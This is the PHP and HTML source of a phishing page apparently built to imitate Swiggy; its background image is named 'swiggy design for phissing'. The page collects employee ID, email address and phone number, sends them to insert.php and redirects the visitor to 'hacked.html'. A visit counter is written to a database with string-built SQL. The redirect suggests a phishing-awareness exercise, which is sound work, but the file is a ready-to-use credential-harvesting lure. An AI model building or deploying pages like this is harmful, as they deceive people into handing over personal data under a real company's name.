<?php
session_start();

if (isset($_SESSION['views']))
    $_SESSION['views'] = $_SESSION['views'] + 1;
else
    $_SESSION['views'] = 1;

$count = $_SESSION['views'];

require 'conn.php';

$sql = "insert into couponduplicatecount (count)
        values('$count'); ";
$result = mysqli_query($mysqli, $sql);

session_destroy();

?>


<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body,
        html {
            height: 100%;
            font-family: Arial, Helvetica, sans-serif;
        }

        * {
            box-sizing: border-box;
        }

        .bg-img {
            /* The image used */
            background-image: url("swiggy design for phissing (2).png");

            height: 100%;

            /* Center and scale the image nicely */
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
            position: relative;
        }

        /* Add styles to the form container */


        .container {
            position: absolute;
            /* right: 0; */
            /* margin-right: 1015px; */
            left: 190px;
            margin-top: 220px;
            max-width: 450px;
            min-height: 100px;
            padding: 16px;
            background-color: rgb(235, 179, 128);
        }


        /* Full-width input fields */
        input[type=text],
        input[type=password] {
            width: 100%;
            padding: 15px;
            margin: 5px 0 22px 0;
            border: none;
            background: #f1f1f1;
        }

        input[type=text]:focus,
        input[type=password]:focus {
            background-color: #ddd;
            outline: none;
        }

        /* Set a style for the submit button */
        .btn {
            background-color: #e67b24;
            color: white;
            padding: 16px 20px;
            border: none;
            cursor: pointer;
            width: 100%;
            opacity: 0.9;
        }

        .btn:hover {
            opacity: 1;
        }
    </style>
</head>

<body>

    <div class="bg-img">

        <form action="account.png" class="container">
            <!-- <h1>Login</h1> -->

            <label for="empid"><b>Emp ID</b></label>
            <input type="text" placeholder="Enter Emp ID" id="empid" required>

            <label for="emailid"><b>Email address</b></label>
            <input type="text" placeholder="Enter Password" id="emailid" required>

            <label for="phno"><b>Phone number</b></label>
            <input type="text" placeholder="Enter Phone number" id="phno" required>

            <!-- <button type="submit" class="btn" id="submit">Login</button> -->
            <button type="submit" class="btn btn-primary" id="submit">Submit</button>
        </form>

    </div>

    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script>
        $(document).ready(function() {


            $('#submit').click(function() {
                var empid = $('#empid').val();
                var emailid = $('#emailid').val();
                var phno = $('#phno').val();

                if ($('#empid').val().length === 0 ||
                    $('#emailid').val().length === 0 ||
                    $('#phno').val().length === 0) {
                    alert('Enter all the fields');
                } else {
                    $.get('insert.php', {
                        'empid': empid,
                        'emailid': emailid,
                        'phno': phno

                    }, function() {

                        console.log('worked');
                    }, "json");



                    $('#empid').val("");
                    $('#emailid').val("");
                    $('#phno').val("");

                    console.log('working')

                    var url = 'hacked.html';
                    $(location).prop('href', url);



                }
            })
        });
    </script>

</body>

</html>